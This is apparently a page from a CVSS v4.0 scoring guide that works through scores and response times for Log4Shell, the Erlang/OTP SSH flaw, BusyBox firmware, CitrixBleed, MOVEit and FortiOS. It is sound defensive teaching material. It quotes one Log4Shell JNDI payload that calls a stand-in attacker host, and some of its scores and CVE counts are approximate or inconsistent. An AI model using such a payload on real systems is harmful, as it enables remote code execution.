---
title: "Worked Examples: Real CVEs"
sidebar_position: 6
---

## 8. Worked Example 1: CVE-2021-44228 Log4Shell — Score Evolution Over 72 Hours

Log4Shell is the canonical example of a 10.0 Critical vulnerability that genuinely deserved its score and its emergency response. It also illustrates why CVSS scores must be treated as dynamic, not static.

### The Vulnerability

**CVE-2021-44228** — Apache Log4j2 JNDI injection, disclosed December 9–10, 2021. Log4j2 is a ubiquitous Java logging library used in virtually every Java application stack. The vulnerability allowed unauthenticated remote code execution by logging a specially crafted string like `${jndi:ldap://attacker.com/exploit}`.

```
Base Vector:
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H

Reading the vector:
  AV:N   — Any internet attacker can reach Log4j (it processes log input from requests)
  AC:L   — One malicious string in any logged field (User-Agent, username, etc.)
  AT:N   — No special deployment conditions; Log4j's default config enables JNDI lookup
  PR:N   — Unauthenticated; the string is logged before any auth check
  UI:N   — No user interaction
  VC:H   — Full compromise of the JVM process (RCE)
  VI:H   — Arbitrary code execution = arbitrary data modification
  VA:H   — Process crash or disruption possible
  SC:H   — Applications run with broad permissions; lateral movement to databases,
           APIs, secrets vaults is documented in nearly every case study
  SI:H   — Downstream integrity compromise confirmed in attacks
  SA:H   — Downstream availability impact confirmed

Base Score: 10.0 Critical
```

### Hour 0: Disclosure (December 9, 2021)

```
CVSS-B:  10.0 Critical (vendor-published score)
E:       X (Not Defined) — no public exploit yet at moment of NVD publication

Security team action with default (E:X):
  Scanner shows 10.0 — emergency response initiated
  This is CORRECT. E:X defaults to E:A, and JNDI proof-of-concept
  was already circulating in private channels at disclosure.
```

### Hour 12–24: PoC Goes Public

By December 10–11, multiple working proof-of-concept exploits appeared on GitHub. Mass scanning for vulnerable Log4j endpoints began within hours.

```
Threat update: E:P (POC publicly available)
EPSS: immediately climbs toward 0.90+

CVSS-BT: still 10.0 Critical (E:P keeps score near maximum)

What changed operationally: The window for "orderly patching" closed.
Evidence of active scanning meant any vulnerable internet-facing system
was being actively probed.
```

### Hour 48–72: Mass Exploitation — Botnets, Ransomware, State Actors

By December 11–13, CISA confirmed active exploitation. The KEV catalog entry was published with a remediation due date of December 24, 2021 (for federal agencies). NSA, GCHQ, and CISA issued joint advisories. Threat actors confirmed exploiting Log4Shell included Conti ransomware affiliates, Iranian state actors (APT35/Charming Kitten), Chinese state actors, and multiple criminal groups.

```
Threat update: E:A (actively exploited — CISA KEV confirmed)

CVSS-BT: 10.0 Critical (E:A maximum)

Any environmental adjustment to MAV or MAC must be verified:
  "Is this system actually isolated from the internet?"
  → Internet-facing: 10.0 — immediate patch, no exceptions
  → Internal, no JNDI enabled: consider E:P + MAV:A → ~7.4 High
  → Internal, JNDI disabled in Log4j config: document mitigation as
    compensating control; MAT:P or MAC:H may apply

Note: CVE-2021-45046 (bypass for initial mitigations) and
CVE-2021-45105 (DoS) were published within days, complicating patching.
```

### Final Score Comparison: Same CVE, Different Contexts

| System Type | Vector Additions | BTE Score | Response |
|-------------|-----------------|-----------|---------|
| Internet-facing Java app | E:A | 10.0 Critical | Immediate: patch or WAF rule NOW |
| Internal app, JNDI disabled | E:A/MAC:H/MAT:P | ~6.8 Medium | Emergency window, 48–72 hrs |
| Internal app, Log4j ≥ 2.17 | E:A (CVE-44228 mitigated) | N/A | Validate version, document |
| Containerized, internet-facing | E:A/AR:H | 10.0 Critical | Rebuild container from patched base |
| Test env (non-production) | E:A/CR:L/IR:L/AR:L/MAV:A | 4.2 Medium | Next deployment cycle |

**Key lesson:** Even for a genuine 10.0 emergency, environmental context changes the *response mechanism* even when it cannot reduce the overall priority. An internet-facing production server and an internal test instance require different actions, documented by CVSS-BTE.

---

## 9. Worked Example 2: CVE-2025-32433 Erlang/OTP SSH — From 10.0 to 5.9

CVE-2025-32433 is an unauthenticated pre-auth RCE in Erlang/OTP's SSH server. Base score 10.0. This example demonstrates how environmental context appropriately reduces emergency response to scheduled patching.

### Step 0: The Base Score (NVD Published)

```
Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
Score:  10.0 Critical

Reading the vector:
  AV:N  — SSH is exposed (vendor assumes internet-facing, worst case)
  AC:L  — Exploitation is straightforward once you reach the SSH port
  AT:N  — No special configuration required; default OTP SSH setup is vulnerable
  PR:N  — Pre-authentication RCE — no credentials needed
  UI:N  — No user interaction required
  VC:H  — Full code execution on the Erlang/OTP process
  VI:H  — Attacker can write files, modify state
  VA:H  — Can crash or kill the OTP application
  SC:H  — Erlang applications often manage distributed systems; lateral pivot possible
  SI:H, SA:H — Downstream system compromise possible
```

### Step 1: Modify Attack Vector — Is SSH Actually Exposed?

```
Question: Is this Erlang/OTP SSH service accessible from the internet?

Scenario A — Internet-facing (load balancer → Erlang cluster):
  No change. AV:N is accurate. Score: 10.0.
  This is a genuine emergency. Patch or firewall the port immediately.

Scenario B — Internal cluster, accessible from corporate network only:
  MAV:A (Modified Attack Vector: Adjacent)
  Evidence: Firewall rule FW-1042, network topology confirms no external routing.

  Updated vector: CVSS:4.0/.../MAV:A
  Updated score:  9.4 Critical

  Still Critical — but attacker must have already penetrated your perimeter.
  Different threat model.
```

### Step 2: Add Attack Complexity — Compensating Controls

```
In many corporate deployments, SSH access also requires:
  - VPN connection with hardware token MFA
  - Jump host (bastion server) with session recording
  - IP allowlist restricting to specific admin hosts

→ MAC:H (Modified Attack Complexity: High)

Updated vector: CVSS:4.0/.../MAV:A/MAC:H
Updated score:  8.7 High

Now in High tier — 30-day SLA instead of a 24–72 hour emergency response.
```

### Step 3: Add Threat Intelligence

```
Checking sources (as of initial disclosure):

CISA KEV: Not listed at initial disclosure (April 2025); added June 2025
           with due date 2025-06-30 — confirms active exploitation
EPSS:     ~0.04 initially; climbed above 0.50 by time of KEV addition
ExploitDB: No entry at initial disclosure
GitHub:   POC repositories appeared within days of disclosure (search CVE-2025-32433)

Phase A — at initial disclosure (no KEV, no exploit):
  → E:P (POC exists, not yet confirmed exploited)
  Updated vector: CVSS:4.0/.../E:P/MAV:A/MAC:H
  Updated score:  7.4 High (30-day SLA)

Phase B — after KEV addition (June 2025):
  → E:A (actively exploited — reclassify immediately)
  Updated vector: CVSS:4.0/.../E:A/MAV:A/MAC:H
  Updated score:  ~9.0 Critical (24–72 hour response)

This is exactly the dynamic re-scoring the CVSS lifecycle model requires:
when the E metric changes, the SLA changes — no manual review needed if automated.
```

### Step 4: Assess Subsequent System Impact

```
Question: Can this Erlang/OTP node reach sensitive downstream systems?

Scenario A — Erlang node manages distributed message queue with connections
to all application databases:
  No change to SC/SI/SA — the blast radius is real.
  Score stays at 7.4 High.

Scenario B — Isolated analytics Erlang node, read-only DB access,
no write access to production systems:
  MSC:L / MSI:N / MSA:L
  "Node only reads from replica DB, no write paths, no service account
  with production access. Network egress rules FW-2089 confirmed."

  Updated score: ~6.1 Medium
```

### Final Comparison Table

| Scenario | Vector Additions | Score | Severity | Action |
|----------|-----------------|-------|----------|--------|
| Base (NVD, all defaults) | — | 10.0 | Critical | Emergency: 24–72 hrs |
| Internet-facing, no exploit | E:U | ~6.7 | Medium | Next patch cycle |
| Internet-facing, POC exists | E:P | 8.4 | High | 7-day SLA |
| Internet-facing, in KEV | E:A | 10.0 | Critical | Immediate |
| Internal, MFA VPN, POC | E:P/MAV:A/MAC:H | 7.4 | High | 30-day SLA |
| Internal, isolated, no exploit | E:U/MAV:A/MAC:H/MSC:N/MSI:N/MSA:N | 5.9 | Medium | 90-day SLA |

**The takeaway:** A genuine 10.0 pre-auth RCE becomes a 5.9 Medium for an internal, MFA-protected, isolated node with no active exploit. That is not negligence — that is accurate risk modeling.

---

## 10. Worked Example 3: Firmware Report — 18 Criticals Become Medium

![](/img/cvss/1_eY9fGmcZJ_M1qajmdHXeBg.png)
![](/img/cvss/1_BlS9ghtDCXWr-Lc5OjtY9A.png)
![](/img/cvss/1_97sxvbu02pAvKM1TZBlSCQ.png)


This example demonstrates how Environmental metrics transform a firmware scanner report into an actionable prioritized list.

### The Problem

A firmware scan of an industrial IoT sensor returns:

| Component | Version | Base Severity | CVE Count |
|-----------|---------|-------------|-----------|
| BusyBox | 1.18.4 | Multiple Critical | 18 CVEs |
| OpenSSH | 8.0p1 | High | 9 CVEs |
| OpenSSL | 1.0.2k | Medium-High | 6 CVEs |

The raw scanner output shows 3 Critical CVEs and 13 High CVEs — all requiring immediate response under Base-only scoring.

### The Device Context

- Industrial flow sensor on a process control OT network
- **Not internet-accessible** — connected only to local OT subnet
- Read-only sensor data; no PII, no financial data
- No GUI, no interactive user sessions
- Vendor scored all CVEs assuming internet-facing deployment (BusyBox can be deployed anywhere)

### Key Environmental Adjustment: MAV:A

BusyBox CVEs with `AV:N` assume the applet is accessible from the internet. On this sensor, it is accessible only from the adjacent OT subnet. Single adjustment: `MAV:A`.

### Before and After

| CVE | Component | Base Score | Base Rating | MAV:A Score | New Rating |
|-----|-----------|-----------|-------------|-------------|------------|
| CVE-2022-48174 | BusyBox | 9.8 | **Critical** | 8.8 | High |
| CVE-2016-2148 | BusyBox | 9.8 | **Critical** | 8.8 | High |
| CVE-2018-1000517 | BusyBox | 9.8 | **Critical** | 8.8 | High |
| CVE-2016-2147 | BusyBox | 7.5 | High | 6.5 | **Medium** |
| CVE-2011-5325 | BusyBox | 7.5 | High | 6.5 | **Medium** |
| CVE-2019-5747 | BusyBox | 7.5 | High | 6.5 | **Medium** |
| CVE-2021-42379 | BusyBox | 7.2 | High | 6.8 | **Medium** |
| CVE-2023-38546 | OpenSSL | 3.7 | Low | 3.7 | Low (unchanged) |

**Summary transformation:**

| Severity | Base Count | After MAV:A | With E:U (no exploit evidence) |
|----------|-----------|-------------|-------------------------------|
| Critical | 3 | **0** | **0** |
| High | 13 | **6** | **3** |
| Medium | 2 | **12** | **15** |

**Result:** The 3am emergency patching requirement disappears. The highest-priority items are now High severity, manageable within the next OT maintenance window. A team that was facing a weekend emergency now has a structured, scheduled response.

### Important Caveat: Safety Metrics for OT

If this sensor is part of a safety-critical process control system (chemical plant, power grid, water treatment), add the Supplemental Safety metric:

```
/S:P (Safety: Present)

This does not change the CVSS score. But it flags to any responder
that exploitation could have physical safety consequences — and those
consequences must be evaluated against the CVSS-BTE severity.

A CVSS-BTE 6.5 Medium with S:P on a safety controller may require
faster response than a 7.9 High with S:N on an admin workstation.
```

---

## 11. Worked Example 4: CitrixBleed, MOVEit, FortiOS

Three real-world cases from 2023–2024 that illustrate different CVSS adjustment scenarios.

### Case A: CVE-2023-4966 — CitrixBleed (Citrix NetScaler)

**Vulnerability:** Sensitive information disclosure in Citrix NetScaler Application Delivery Controller (ADC) and Gateway. An unauthenticated attacker could retrieve session tokens, enabling session hijacking without credentials. Used extensively by ransomware affiliates (LockBit, Medusa) and government-sector attackers.

```
Base Vector:
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H
Base Score: 9.4 Critical

Reading the base vector:
  AV:N  — NetScaler is internet-facing by design (it is a load balancer/VPN endpoint)
  AC:L  — Single HTTP request to /gwtest/formssso endpoint
  AT:N  — No special preconditions; affects default configuration
  PR:N  — Unauthenticated
  UI:N  — No user interaction
  VC:H  — Session token retrieved → full user account access
  VI:N  — The vulnerability itself doesn't modify data on NetScaler
  VA:N  — No availability impact from session theft
  SC:H  — Session tokens enable access to downstream internal resources
  SI:H  — Attacker with stolen session can modify data in downstream systems
  SA:H  — Downstream systems can be disrupted

CISA KEV: Added October 18, 2023 (within weeks of disclosure)
EPSS: ~0.97+ (extremely high, immediate mass exploitation)
Threat actors: LockBit affiliate, Boeing breach (confirmed), Allen & Overy, more
```

**Environmental scoring for an external-facing Citrix deployment:**

```
For a typical enterprise with internet-facing NetScaler:
  E:A  — In CISA KEV, confirmed ransomware exploitation

BTE (no modification possible — it IS internet-facing):
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H/E:A
Score: 9.4 Critical — Immediate response required.
No environmental adjustment can justify delay here.
If you have an internet-facing NetScaler, this requires a 24–72 hour emergency response.
```

**Key operational point:** CitrixBleed demonstrates why `E:A` (CISA KEV entry) must immediately override any environmental reduction arguments. The question is not "is our NetScaler important enough to patch quickly?" The question is "are there ransomware groups scanning for CitrixBleed right now?" The answer (confirmed by CISA, FBI, and multiple incident response reports) was: yes.

### Case B: CVE-2023-34362 — MOVEit Transfer SQLi

**Vulnerability:** SQL injection in Progress Software's MOVEit Transfer managed file transfer platform. Exploited exclusively by the Cl0p ransomware group in a coordinated mass-exploitation campaign in May–June 2023. Affected 2,000+ organizations globally, including government agencies, hospitals, and financial firms.

```
Base Vector:
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
Base Score: 9.8 Critical

Key characteristics:
  AT:N — Default configuration is vulnerable
  AU:Y (Supplemental: Automatable: Yes) — Cl0p used automated mass exploitation
  V:C  (Supplemental: Value Density: Concentrated) — File transfer platforms hold
       files from MANY organizations → single compromise = mass data access
```

**The supply chain scoring challenge:**

MOVEit Transfer is a *managed file transfer service*. Organizations that used it often uploaded data from multiple business partners. The Subsequent System impact in v4.0 terms extends not just to internal systems, but to third-party data processed through the platform.

```
For a MOVEit instance processing healthcare data for 50 partner organizations:

SC:H (data from all 50 partner orgs is accessible)
SI:H (data integrity of all 50 orgs' files at risk)
SA:H (disruption affects all 50 orgs' workflows)

This is exactly the v4.0 Subsequent System model working as intended.
The "blast radius" in SC/SI/SA must reflect the full downstream exposure,
not just the immediate server.
```

### Case C: CVE-2024-21762 — FortiOS SSL VPN Out-of-Bounds Write

**Vulnerability:** Out-of-bounds write in FortiOS and FortiProxy SSL VPN. Enables unauthenticated remote code execution via specially crafted HTTP requests. Exploited by Chinese state-sponsored threat actors (attributed to Volt Typhoon and related clusters) for initial access into US critical infrastructure.

```
Base Vector:
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
Base Score: 9.6 Critical

CISA KEV: Added February 9, 2024
Attribution: Chinese state actors (Volt Typhoon, BRONZE SILHOUETTE)
Targets: US telecom, utilities, water systems, defense contractors
EPSS: ~0.97+
```

**Why environmental adjustments cannot help here:**

```
Some organizations attempted to argue:
  "Our FortiGate is behind our ISP's firewall" → This is the perimeter device;
  it IS the firewall. MAV:A does not apply.

  "We have IDS monitoring" → FortiOS exploitation bypasses host-based monitoring
  because the exploit targets the device providing network access.

  "We have incident response capability" → This affects recovery, not exploitability.

For any internet-facing SSL VPN endpoint: E:A + AV:N = no score reduction possible.
The CVSS-BTE remains at or near 9.6 Critical.
```

**Key lesson from these three cases:** Environmental metrics are for reducing false priorities on legitimate non-urgent vulnerabilities. They are not for manufacturing justifications to defer critical work. When CISA KEV + high EPSS + confirmed exploitation by nation-state or ransomware actors = `E:A`, your response is patching, not scoring.

---

## Scoring Your Own CVEs: A Template

Use this template for any new CVE that appears in your scanner output:

```
CVE: ___________
NVD Base vector: CVSS:4.0/AV:_/AC:_/AT:_/PR:_/UI:_/VC:_/VI:_/VA:_/SC:_/SI:_/SA:_
CVSS-B Score: ___  Severity: ___

Step 1 — Threat enrichment (automated):
  CISA KEV: YES / NO
  EPSS: ___  (percentile: ___th)
  ExploitDB: YES / NO  (EDB-ID: ___)
  Metasploit module: YES / NO
  E: value →  A / P / U
  CVSS-BT Score: ___

Step 2 — Environmental: Is this system internet-facing?
  YES → AV:N stays, no MAV change
  NO  → MAV: A / L / P  (circle one)
  Evidence: ___________

Step 3 — Environmental: Are compensating access controls in place?
  VPN required: YES / NO  → MAC:H if YES
  MFA required: YES / NO
  Jump host required: YES / NO
  Evidence: ___________

Step 4 — Data sensitivity: Is VC:H appropriate?
  System processes PII/financial/health data: YES / NO
  If NO: MVC: L / N

Step 5 — Blast radius: Are SC/SI/SA:H appropriate?
  Can the compromised system reach other systems laterally? YES / NO
  If NO: MSC:N / MSI:N / MSA:N
  Evidence (network diagram, egress rules): ___________

Step 6 — Asset criticality: Adjust CR/IR/AR?
  Is this system business-critical? Raise CR:H / IR:H / AR:H as appropriate.
  Is this a dev/test environment? Lower to CR:L / IR:L / AR:L.

Final CVSS-BTE vector: CVSS:4.0/[base]/[threat]/[env]
CVSS-BTE Score: ___  Severity: ___
SLA: ___
Approved by: ___  Date: ___
```

---

## Related Chapters

| Chapter | What you'll find |
|---------|-----------------|
| [Vector String Anatomy](/docs/vector-string) | How to read every field in the vectors above |
| [Threat & Environmental Metrics](/docs/threat-metrics) | Step-by-step E: determination and adjustment decisions |
| [Scoring Lifecycle](/docs/lifecycle) | The B→BT→BTE framework these examples demonstrate |
| [Industry-Specific Scoring](/docs/industry-specific) | How the same CVE scores differently in healthcare vs OT/ICS |
| [Cheatsheet](/docs/cheatsheet) | Score impact table + common vector examples |
